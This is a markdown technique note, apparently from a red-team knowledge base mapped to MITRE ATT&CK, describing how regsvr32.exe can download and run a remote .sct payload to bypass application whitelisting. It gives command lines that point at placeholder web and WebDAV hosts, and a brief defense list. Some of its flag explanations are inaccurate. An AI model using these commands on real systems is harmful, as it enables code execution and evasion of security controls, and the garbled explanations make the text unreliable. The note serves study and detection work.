---
id: eaffaa28-5f1e-452f-b05b-8d5779df77d1
name: Windows Download and Execute via Regsvr32
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.955305+00:00'
updated_at: '2023-04-10T20:37:09.926932+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Regsvr32|T1117 - Regsvr32]]'
tags:
- '[[Regsvr32 @subTee]]'
- '[[Windows - Download and execute methods]]'
---

# Windows Download and Execute via Regsvr32

## Summary

This technique involves using regsvr32.exe to download and execute a remote payload. Regsvr32 is a legitimate Windows utility used to register and unregister DLL files. This technique abuses the /u flag, which unregisters a DLL, to execute a remote payload. The remote payload is specified in a .sct

## Description

# Description

This technique involves using regsvr32.exe to download and execute a remote payload. Regsvr32 is a legitimate Windows utility used to register and unregister DLL files. This technique abuses the /u flag, which unregisters a DLL, to execute a remote payload. The remote payload is specified in a .sct file, which is a legitimate Windows Scriptlet file used for HTML Applications (HTAs). The .sct file is hosted remotely and downloaded by regsvr32.exe when it is executed with the /u flag. Once downloaded, the .sct file is executed, resulting in the execution of the remote payload. This technique can be used to bypass application whitelisting and other security controls.

 

## Requirements

1. Authenticated access to a Windows system

1. Ability to execute regsvr32.exe

 

## Defense

1. Implement application whitelisting to block execution of regsvr32.exe

1. Monitor for use of regsvr32.exe with the /u flag

1. Use network segmentation to limit access to remote payloads

 

## Objectives

1. Download and execute a remote payload on a target system

1. Bypass application whitelisting and other security controls

 

# Instructions

1. To unregister a DLL file using regsvr32, use the following command:
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

Replace 'http://webserver/payload.sct' with the URL of the script you want to execute on the target system. Replace 'scrobj.dll' with the name of the DLL file you want to unregister.

 



**Code**: [[regsvr32 /u /n /s /i:http://webserver/payload.sct ]]



> This command unregisters a DLL file on a Windows system. The '/u' option specifies that the DLL file should be unregistered. The '/n' option specifies that no DllRegisterServer or DllUnregisterServer messages should be displayed. The '/s' option specifies that the command should be run silently without displaying any messages. The '/i' option specifies that the DLL file should be unregistered using a script located at the specified URL.

2. To unregister scrobj.dll with payload.sct, run the following command:

 



**Code**: [[regsvr32 /u /n /s /i:\\webdavserver\folder\payload]]



> This command unregisters the scrobj.dll file with the payload.sct script. The /u flag unregisters the specified DLL file, /n specifies to not display any messages during the process, /s specifies to run the command silently, and /i specifies to pass an optional command-line parameter to the DLL file being registered or unregistered. The argument \\webdavserver\folder\payload.sct specifies the path to the payload.sct file that will be used in conjunction with the scrobj.dll file.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Regsvr32|T1117 - Regsvr32]]

## Tags

- [[Regsvr32 @subTee]]
- [[Windows - Download and execute methods]]


